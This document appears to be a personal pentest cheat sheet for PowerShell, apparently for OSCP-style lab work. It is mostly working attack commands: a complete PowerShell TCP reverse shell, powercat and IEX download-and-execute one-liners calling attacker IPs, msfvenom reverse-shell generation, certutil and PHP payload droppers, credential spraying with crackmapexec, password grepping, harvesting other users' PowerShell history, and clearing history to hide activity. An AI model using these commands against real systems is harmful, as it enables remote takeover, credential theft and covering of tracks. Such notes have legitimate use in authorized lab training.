# PowerShell

PowerShell execution, download helpers, environment checks, language mode, applocker visibility, and practical execution helpers.

## CLEAR POWERSHELL HISTORY?

```powershell
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

## Final Powershell History

```rust
Get-ChildItem "C:\Users" -Directory | ForEach-Object { $historyFile = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"; if (Test-Path $historyFile) { Write-Host "Found in $($_.Name):"; Get-Content $historyFile } else { Write-Host "No history file for $($_.Name)" } }

```

Try craackmap with local auth and without
```rust
crackmapexec smb 10.10.120.154 -u users.txt -p passwords.txt --local-auth
rust
Get-ChildItem -Path "C:\Users\" -Recurse -File
```
```
dir "C:\Users" /s /b /a-d

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

findstr /SIM /C:"administrator" *.txt *.ini *.cfg *.config *.xml
```

## Windows Download file (PowerShell)

```
iwr "http://<listen_ip>:<listen_port>/<filename>" -OutFile "<filename>"
```

## Hostname to IP (powershell)

```
[System.Net.Dns]::GetHostByAddress("<ip_address>").Hostname
```

## Hostnames to IP (powershell)

```
1..254 | ForEach-Object { Try { Write-Host -NoNewline ([System.Net.Dns]::GetHostByAddress("<class_C>.$_").Hostname);echo "  $_;" } Catch { } }
```

## Recon LanguageMode

```
$ExecutionContext.SessionState.LanguageMode
```

## Recon Portscan

```
Test-NetConnection -ComputerName <ip> -Port <port>
```

## Recon Check 32 bit or 64 bit

```
powershell -c "[Environment]::Is64BitProcess"
```

## Powershell history defualt location

```
type C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Recon Check PPL (Lsass Protection)

```
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Recon Check Applocker rules

```
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## Recon PortScan (Slow)

```
$target = '<IP>';$scanPorts = @('25', '80', '88', '110', '135', '139', '389', '443', '445', '1433', '3128', '8080', '8081', '5985', '5986'); foreach($port in $scanPorts){Write-Host $port; Test-NetConnection -ComputerName $target -InformationLevel "Quiet" -Port $port}
```

## Recon PortScan (Invoke-Portscan.ps1)

```
Invoke-Portscan -Hosts "<IP>" -TopPorts 400 | Select-Object -ExpandProperty openPorts
```

## PowerShell Call 64 bit - 1

```
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

## PowerShell Call 64 bit - 2

```
Environ("COMSPEC") & " /k c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
```

## PowerShell Call 64 bit - 3

```
&"$env:windir\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
```

## Break out JEA

https://infra.newerasec.com/infrastructure-testing/breakout/just-enough-administration-jea
```
&{ <cmd> }
```

## Exec remote ps1 (PowerShell)

```
powershell i`e`x(iWr -UsEbaSIcparSING http://<listen_ip>:<listen_port>/<filename>);
```

---

PowerShell - one-liner:
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe%20-enc%20<base64 encoded payload>

powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

PowerShell + Powercat

```
powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191/powercat.ps1');powercat -c 192.168.45.191 -p 443 -e powershell

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.168/powercat.ps1'); powercat -c 192.168.45.168 -p 443 -e cmd.exe

cmd /c "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1'); powercat -c 192.168.45.197 -p 443 -e cmd.exe"
```

Msfvenom based

```
//32 bit
msfvenom -p windows/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443
//64 bit
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443
//download + execute (2 stage)
certutil -urlcache -split -f http://192.168.45.3/shell.exe C:/Windows/Temp/shell.exe
C:/Windows/Temp/shell.exe
```

PHP custom two stager - Windows

```
<?php
$download = system('certutil.exe -urlcache -split -f http://192.168.45.210/shell.exe shell.exe', $val)
?>
```
```
<?php
$exec = system('shell.exe', $val)
?>
```

example of usage:

Refer to here next: [Got shitty cmd shell?](https://github.com/Daniel-Ayz/OSCP/blob/main/Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f.md)
